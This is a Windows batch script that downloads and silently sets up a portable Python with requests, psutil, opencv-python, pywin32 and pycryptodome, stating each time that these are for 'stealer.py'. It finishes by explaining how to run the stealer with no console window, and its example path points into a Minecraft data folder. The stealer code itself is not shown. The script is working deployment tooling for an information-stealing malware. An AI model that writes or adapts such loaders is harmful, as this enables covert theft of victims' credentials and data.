@echo off
setlocal EnableDelayedExpansion

:: Set PYTHON_DIR to match the bot's user (Home or alexs)
:: Change to "C:\Users\alexs\Python312" if bot runs under alexs
set "PYTHON_DIR=%USERPROFILE%\Python312"
set "LOG_FILE=%TEMP%\install_log.txt"
set "ZIP=%TEMP%\python-embed.zip"
set "URL=https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
set "PIP_SCRIPT=%TEMP%\get-pip.py"
set "PIP_URL=https://bootstrap.pypa.io/get-pip.py"
set "PYCRYPTODOME_WHEEL=%TEMP%\pycryptodome.whl"
set "PYCRYPTODOME_URL=https://files.pythonhosted.org/packages/3b/16/ff08c8f9f3b9d6091143b7ea1d6c2944f6b27a6b16a6e6e17bd6b8a4df53/pycryptodome-3.21.0-cp312-cp312-win_amd64.whl"

:: Redirect output to log file
echo Starting installation at %DATE% %TIME% > "%LOG_FILE%"

:: Clean existing Python directory
if exist "%PYTHON_DIR%" (
    echo Cleaning existing Python directory: %PYTHON_DIR% >> "%LOG_FILE%"
    rmdir /s /q "%PYTHON_DIR%"
)

:: Download Python
echo Downloading Python from %URL% to %ZIP% >> "%LOG_FILE%"
curl.exe -L -o "%ZIP%" "%URL%" >> "%LOG_FILE%" 2>&1
if not exist "%ZIP%" (
    echo Error: Python zip not downloaded. Check internet connection. >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 1
)

:: Extract Python
echo Extracting %ZIP% to %PYTHON_DIR% >> "%LOG_FILE%"
mkdir "%PYTHON_DIR%"
tar -xf "%ZIP%" -C "%PYTHON_DIR%" >> "%LOG_FILE%" 2>&1
if not exist "%PYTHON_DIR%\pythonw.exe" (
    echo Error: pythonw.exe not found in %PYTHON_DIR%. Contents: >> "%LOG_FILE%"
    dir "%PYTHON_DIR%" >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 2
)

:: Enable site-packages in python312._pth
echo Enabling site-packages in python312._pth >> "%LOG_FILE%"
echo import site>> "%PYTHON_DIR%\python312._pth"

:: Download get-pip.py
echo Downloading get-pip.py from %PIP_URL% to %PIP_SCRIPT% >> "%LOG_FILE%"
curl.exe -L -o "%PIP_SCRIPT%" "%PIP_URL%" >> "%LOG_FILE%" 2>&1
if not exist "%PIP_SCRIPT%" (
    echo Error: get-pip.py not downloaded. Check internet connection. >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 3
)

:: Install pip
echo Installing pip... >> "%LOG_FILE%"
"%PYTHON_DIR%\python.exe" "%PIP_SCRIPT%" --no-warn-script-location >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
    echo Error: pip installation failed. Check permissions or internet. >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 4
)

:: Verify pip
echo Verifying pip installation... >> "%LOG_FILE%"
"%PYTHON_DIR%\python.exe" -m pip --version >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
    echo Error: pip not installed correctly. Check %PYTHON_DIR%\Scripts\pip.exe >> "%LOG_FILE%"
    dir "%PYTHON_DIR%\Scripts" >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 5
)

:: Install required modules
echo Installing modules for stealer.py... >> "%LOG_FILE%"
for %%m in (requests psutil opencv-python pywin32) do (
    echo Installing %%m... >> "%LOG_FILE%"
    "%PYTHON_DIR%\python.exe" -m pip install %%m --no-cache-dir >> "%LOG_FILE%" 2>&1
    if errorlevel 1 (
        echo Error: Failed to install %%m. Check network or permissions. >> "%LOG_FILE%"
        type "%LOG_FILE%"
        exit /b 6
    )
)

:: Install pycryptodome (try PyPI first, then fallback to wheel)
echo Installing pycryptodome... >> "%LOG_FILE%"
"%PYTHON_DIR%\python.exe" -m pip install pycryptodome --no-cache-dir >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
    echo PyPI install failed. Trying wheel file... >> "%LOG_FILE%"
    curl.exe -L -o "%PYCRYPTODOME_WHEEL%" "%PYCRYPTODOME_URL%" >> "%LOG_FILE%" 2>&1
    if exist "%PYCRYPTODOME_WHEEL%" (
        "%PYTHON_DIR%\python.exe" -m pip install "%PYCRYPTODOME_WHEEL%" >> "%LOG_FILE%" 2>&1
        if errorlevel 1 (
            echo Error: Failed to install pycryptodome from wheel. >> "%LOG_FILE%"
            type "%LOG_FILE%"
            exit /b 7
        )
    ) else (
        echo Error: Failed to download pycryptodome wheel. >> "%LOG_FILE%"
        type "%LOG_FILE%"
        exit /b 7
    )
)

:: Verify pycryptodome
echo Verifying pycryptodome installation... >> "%LOG_FILE%"
"%PYTHON_DIR%\python.exe" -c "import Cryptodome; print('pycryptodome is installed')" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
    echo Error: pycryptodome not installed. Check %PYTHON_DIR%\Lib\site-packages. >> "%LOG_FILE%"
    dir "%PYTHON_DIR%\Lib\site-packages" >> "%LOG_FILE%"
    type "%LOG_FILE%"
    exit /b 8
)

:: Update PATH
echo Setting PATH for current session... >> "%LOG_FILE%"
set "PATH=%PYTHON_DIR%;%PATH%"

:: Clean up
echo Cleaning up... >> "%LOG_FILE%"
del "%ZIP%" >nul 2>&1
del "%PIP_SCRIPT%" >nul 2>&1
del "%PYCRYPTODOME_WHEEL%" >nul 2>&1

echo Portable Python installed in %PYTHON_DIR%. Check %LOG_FILE% for details.
echo To run stealer.py without console, use: "%PYTHON_DIR%\pythonw.exe" path_to_stealer.py
echo Example: "%PYTHON_DIR%\pythonw.exe" C:\Users\Home\AppData\Roaming\.minecraft\downloaded_1757956729.py
type "%LOG_FILE%"

endlocal
exit /b 0